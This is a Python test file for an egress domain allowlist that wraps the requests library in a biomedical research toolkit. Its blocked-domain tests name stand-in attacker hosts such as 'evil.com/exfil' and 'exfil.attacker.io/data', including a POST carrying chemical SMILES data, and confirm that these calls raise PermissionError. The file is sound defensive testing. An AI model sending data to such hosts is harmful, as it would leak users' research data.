"""
Tests for tools/_allowlist.py — egress domain allowlist.
"""
import importlib
import sys
import unittest
from unittest.mock import MagicMock, patch


def _fresh_allowlist():
    """Import allowlist with a clean requests mock to avoid patching real requests."""
    # Remove cached module so each test class can re-import cleanly
    for key in list(sys.modules.keys()):
        if "_allowlist" in key:
            del sys.modules[key]
    import tools._allowlist as al
    return al


class TestDomainMatching(unittest.TestCase):

    def setUp(self):
        self.al = _fresh_allowlist()

    # --- approved exact domains ---
    def test_fda_allowed(self):
        self.assertTrue(self.al._is_allowed("https://api.fda.gov/drug/event.json"))

    def test_opentargets_allowed(self):
        self.assertTrue(self.al._is_allowed("https://api.platform.opentargets.org/api/v4/graphql"))

    def test_clinicaltrials_allowed(self):
        self.assertTrue(self.al._is_allowed("https://clinicaltrials.gov/api/v2/studies"))

    def test_arxiv_allowed(self):
        self.assertTrue(self.al._is_allowed("https://arxiv.org/search/?query=KRAS"))

    def test_export_arxiv_allowed(self):
        self.assertTrue(self.al._is_allowed("https://export.arxiv.org/api/query"))

    def test_string_db_allowed(self):
        self.assertTrue(self.al._is_allowed("https://string-db.org/api/json/network"))

    def test_gnomad_allowed(self):
        self.assertTrue(self.al._is_allowed("https://gnomad.broadinstitute.org/api"))

    def test_pubchem_allowed(self):
        self.assertTrue(self.al._is_allowed("https://pubchem.ncbi.nlm.nih.gov/rest/pug"))

    def test_eutils_allowed(self):
        self.assertTrue(self.al._is_allowed("https://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi"))

    def test_cbioportal_allowed(self):
        self.assertTrue(self.al._is_allowed("https://www.cbioportal.org/api/genes/EGFR"))

    def test_patentsview_allowed(self):
        self.assertTrue(self.al._is_allowed("https://api.patentsview.org/patents/query"))

    def test_lens_allowed(self):
        self.assertTrue(self.al._is_allowed("https://api.lens.org/patent/search"))

    def test_localhost_allowed(self):
        self.assertTrue(self.al._is_allowed("http://127.0.0.1:8083/health"))

    def test_localhost_name_allowed(self):
        self.assertTrue(self.al._is_allowed("http://localhost:8083/fold"))

    # --- wildcard *.ebi.ac.uk ---
    def test_ebi_www_allowed(self):
        self.assertTrue(self.al._is_allowed("https://www.ebi.ac.uk/chembl/api"))

    def test_ebi_rest_subdomain_allowed(self):
        self.assertTrue(self.al._is_allowed("https://rest.ebi.ac.uk/search"))

    def test_europepmc_via_ebi_allowed(self):
        # tools/literature.py calls EuropePMC via www.ebi.ac.uk/europepmc/... (wildcard match)
        self.assertTrue(self.al._is_allowed("https://www.ebi.ac.uk/europepmc/webservices/rest/search"))

    def test_ebi_root_allowed(self):
        # *.ebi.ac.uk wildcard also permits the root ebi.ac.uk (host == suffix check)
        self.assertTrue(self.al._is_allowed("https://ebi.ac.uk"))

    def test_fake_ebi_suffix_blocked(self):
        # notebi.ac.uk does not end with .ebi.ac.uk and is not in exact list
        self.assertFalse(self.al._is_allowed("https://notebi.ac.uk"))

    # --- blocked domains ---
    def test_evil_domain_blocked(self):
        self.assertFalse(self.al._is_allowed("https://evil.com/exfil"))

    def test_attacker_subdomain_blocked(self):
        self.assertFalse(self.al._is_allowed("https://api.attacker-controlled.io/steal"))

    def test_fake_ebi_blocked(self):
        self.assertFalse(self.al._is_allowed("https://fakeebi.ac.uk"))

    def test_empty_url_blocked(self):
        self.assertFalse(self.al._is_allowed(""))

    def test_malformed_url_blocked(self):
        self.assertFalse(self.al._is_allowed("not-a-url"))


class TestMonkeyPatch(unittest.TestCase):
    """Verify the requests monkey-patch raises PermissionError on blocked domains."""

    def setUp(self):
        _fresh_allowlist()
        import requests as req
        self.req = req

    def test_get_blocked_domain_raises(self):
        with self.assertRaises(PermissionError) as ctx:
            self.req.get("https://evil.com/steal-smiles")
        self.assertIn("evil.com", str(ctx.exception))
        self.assertIn("allowlist", str(ctx.exception))

    def test_post_blocked_domain_raises(self):
        with self.assertRaises(PermissionError):
            self.req.post("https://exfil.attacker.io/data", json={"smiles": "CC(=O)Oc1ccccc1"})

    def test_get_allowed_domain_calls_through(self):
        # Allowed domain should reach the original function (may fail with network error,
        # but must NOT raise PermissionError)
        with patch("requests.sessions.Session.send") as mock_send:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_send.return_value = mock_resp
            resp = self.req.get("https://api.fda.gov/drug/event.json")
            self.assertTrue(mock_send.called)

    def test_session_request_blocked(self):
        session = self.req.Session()
        with self.assertRaises(PermissionError):
            session.request("GET", "https://evil.com/exfil")

    def test_session_request_allowed_calls_through(self):
        session = self.req.Session()
        with patch("requests.adapters.HTTPAdapter.send") as mock_send:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {}
            mock_resp.is_redirect = False
            mock_send.return_value = mock_resp
            session.request("GET", "https://api.fda.gov/drug/event.json")
            self.assertTrue(mock_send.called)

    def test_idempotent_patch(self):
        """Importing _allowlist a second time must not double-wrap."""
        import tools._allowlist as al1
        import tools._allowlist as al2
        self.assertIs(al1, al2)
        # Should still raise exactly once
        with self.assertRaises(PermissionError):
            self.req.get("https://evil.com")


if __name__ == "__main__":
    unittest.main()
